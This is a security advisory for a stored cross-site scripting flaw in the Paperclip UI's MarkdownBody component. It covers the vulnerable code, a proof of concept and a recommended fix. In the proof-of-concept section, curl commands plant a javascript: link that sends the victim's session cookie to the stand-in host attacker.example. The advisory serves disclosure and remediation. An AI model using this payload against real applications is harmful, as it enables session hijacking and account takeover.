# [M] Paperclip: Stored XSS via javascript: URLs in MarkdownBody — urlTransform override disables react-markdown sanitization

## Summary
Severity: Medium
Advisory: GHSA-fpw4-p57j-hqmq
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-fpw4-p57j-hqmq
Type: github-advisory

## Affected
- npm: `@paperclipai/ui` — affected >=0 <2026.416.0

## Details
## Summary

`MarkdownBody`, the shared component used to render every Markdown surface in the Paperclip UI (issue documents, issue comments, chat threads, approvals, agent details, export previews, etc.), passes `urlTransform={(url) => url}` to `react-markdown`. That override replaces `react-markdown`'s built-in `defaultUrlTransform` — the library's only defense against `javascript:`/`vbscript:`/`data:` URL injection — with a no-op, and the custom `a` component then renders the unsanitized href directly. Any authenticated company member can plant `[text](javascript:...)` in an issue document or comment; when another member clicks the link, the script executes in the Paperclip origin with full access to the victim's session, enabling cross-user account takeover inside a tenant.

## Details

### 1. Sink: MarkdownBody overrides url sanitization

`ui/src/components/MarkdownBody.tsx:107-135` (custom anchor renderer) and `ui/src/components/MarkdownBody.tsx:162` (Markdown element):

```tsx
a: ({ href, children: linkChildren }) => {
  const parsed = href ? parseMentionChipHref(href) : null;
  if (parsed) { /* mention chip path, rewrites href */ }
  return (
    <a href={href} rel="noreferrer">
      {linkChildren}
    </a>
  );
},
// ...
<Markdown remarkPlugins={[remarkGfm]} components={components} urlTransform={(url) => url}>
  {children}
</Markdown>
```

`react-markdown` v10 ships `defaultUrlTransform` (see `react-markdown` source) which strips any URL whose scheme matches `/^(javascript|vbscript|file|data(?!:image\/(?:gif|jpeg|jpg|png|webp)))/i`. Passing `urlTransform={(url) => url}` replaces that defense with an identity function, so unsafe hrefs flow directly into the custom `a` renderer. React 19 only emits a dev-mode warning for `javascript:` hrefs — in production builds it renders them verbatim, and clicking the link executes the script in the current origin.

### 2. Source: unsanitized markdown bodies

`server/src/routes/issues.ts:815-862` accepts issue document bodies:

```ts
router.put("/issues/:id/documents/:key", validate(upsertIssueDocumentSchema), async (req, res) => {
  // ...
  assertCompanyAccess(req, issue.companyId);
  // ...
  const result = await documentsSvc.upsertIssueDocument({
    issueId: issue.id,
    key: keyParsed.data,
    title: req.body.title ?? null,
    format: req.body.format,
    body: req.body.body,          // ← stored verbatim
    // ...
  });
```

`packages/shared/src/validators/issue.ts:196-202`:

```ts
export const upsertIssueDocumentSchema = z.object({
  title: z.string().trim().max(200).nullable().optional(),
  format: issueDocumentFormatSchema,     // enum: ["markdown"]
  body: z.string().max(524288),          // no content validation
  // ...
});
```

Only the `format` enum and a 512 KiB length cap are enforced; the body is persisted as-is. Comment bodies follow the same pattern — `svc.addComment` (`server/src/routes/issues.ts:1639`) stores a `z.string().min(1)` body (line 166 of the validator).

### 3. Rendering path

`ui/src/components/IssueDocumentsSection.tsx:71-72`:

```tsx
function renderBody(body: string, className?: string) {
  return <MarkdownBody className={className}>{body}</MarkdownBody>;
}
```

`ui/src/components/CommentThread.tsx:372`:

```tsx
<MarkdownBody className="text-sm">{comment.body}</MarkdownBody>
```

The same sink is reused by `IssueChatThread`, `ApprovalDetail`, `AgentDetail`, `CompanySkills`, `CompanyImport`/`CompanyExport`, and `RunTranscriptView`. Every Markdown surface in the product inherits the vulnerability.

### 4. Authorization does not block cross-user reach

`server/src/routes/authz.ts:18-31` (`assertCompanyAccess`) accepts any authenticated user whose `companyIds` includes the target `companyId`. There is no role check — a low-privilege company member can plant a payload against admins and owners who view the issue.

### 5. No compensating CSP

A repository-wide grep for `Content-Security-Policy` finds only two matches, both scoped to sandboxed export/preview responses (`server/src/routes/assets.ts:328` and `server/src/routes/issues.ts:2572`). The main application HTML is served without any CSP, so the browser will happily navigate a `javascript:` href on click.

## PoC

Prerequisites: two accounts in the same company (`attacker` and `victim`), an existing issue `<ISSUE_ID>`, the backend reachable on `http://localhost:3000`.

**Step 1 — Attacker plants a malicious issue document:**

```bash
curl -X PUT 'http://localhost:3000/api/issues/<ISSUE_ID>/documents/plan' \
  -H 'Cookie: <attacker-session-cookie>' \
  -H 'Content-Type: application/json' \
  -d '{
        "format": "markdown",
        "body": "# Plan\n\n[Click for details](javascript:fetch(\"https://attacker.example/steal?c=\"+encodeURIComponent(document.cookie)))"
      }'
```

Expected (verified): `201 Created` with the persisted document JSON. `upsertIssueDocumentSchema` accepts the body because it is a valid markdown string under 524288 bytes.

**Step 2 — Victim opens the issue:**

The victim navigates to the issue in the browser. `IssueDocumentsSection` calls `renderBody(doc.body)` → `<MarkdownBody>`, which emits the DOM:

```html
<a href="javascript:fetch(&quot;https://attacker.example/steal?c=&quot;+encodeURIComponent(document.cookie))" rel="noreferrer">Click for details</a>
```

**Step 3 — Victim clicks the link:**

The browser executes the `javascript:` URL in the Paperclip origin. The attacker's listener receives the victim's session cookie. From there the attacker can replay the cookie against any endpoint guarded by `assertCompanyAccess` to act as the victim — posting comments, transitioning issues, invoking approvals, reading agent keys the victim can read, etc.

**Alternate vector — comments (same sink):**

```bash
curl -X POST 'http://localhost:3000/api/issues/<ISSUE_ID>/comments' \
  -H 'Cookie: <attacker-session-cookie>' \
  -H 'Content-Type: application/json' \
  -d '{"body":"[pwn](javascript:alert(document.cookie))"}'
```

`CommentThread.tsx:372` renders `comment.body` through the same `MarkdownBody` sink, producing the same stored XSS without needing document-edit privileges.

## Impact

- **Cross-user stored XSS inside the tenant.** A low-privilege company member can plant a payload that runs in any other member's session — including admins/owners — on click.
- **Session hijack.** The script executes on the Paperclip origin with access to `document.cookie` and every in-browser API credential; a victim click immediately exfiltrates the session to an attacker-controlled host.
- **Privilege escalation.** Because every `assertCompanyAccess` route accepts a valid session, a captured admin cookie grants full company admin on the API surface (agent keys, approvals, document edits, settings).
- **Tenant-wide blast radius.** The same `MarkdownBody` sink is used by issue documents, issue comments, issue chat, approvals, agent detail, company import/export, and run transcripts, so almost every user-visible text surface in the product is vulnerable.
- **Persistent.** The payload lives in the document or comment record until explicitly deleted.

## Recommended Fix

The minimum fix is to remove the `urlTransform` override in `ui/src/components/MarkdownBody.tsx:162` and rely on `react-markdown`'s `defaultUrlTransform`:

```tsx
// ui/src/components/MarkdownBody.tsx
import Markdown, { defaultUrlTransform, type Components } from "react-markdown";

// ...

// Preserve mention-chip (paperclip-mention://) hrefs so parseMentionChipHref still runs,
// but fall back to the library's scheme allow-list for everything else.
function safeUrlTransform(url: string): string {
  if (url.startsWith("paperclip-mention://")) return url;
  return defaultUrlTransform(url);
}

<Markdown
  remarkPlugins={[remarkGfm]}
  components={components}
  urlTransform={safeUrlTransform}
>
  {children}
</Markdown>
```

`defaultUrlTransform` strips `javascript:`, `vbscript:`, `file:`, and non-image `data:` URIs, which closes this finding for every call site of `MarkdownBody`.

Defense-in-depth recommendations:

1. Add a strict Content-Security-Policy header to the main app response (e.g. `script-src 'self' 'nonce-...'`) so that even a future regression cannot execute inline JS via `javascript:` navigation.
2. Server-side validate document and comment bodies for obviously unsafe markdown patterns (e.g. reject `](javascript:` sequences) as belt-and-braces. Do not rely on client-side sanitization alone, since other clients (mobile, exports) may render the same content.
3. Audit every existing component for other `urlTransform`/`skipHtml`/`rehype-raw` overrides that might reintroduce the same bypass.

## References
- https://github.com/paperclipai/paperclip/security/advisories/GHSA-fpw4-p57j-hqmq
- https://github.com/paperclipai/paperclip
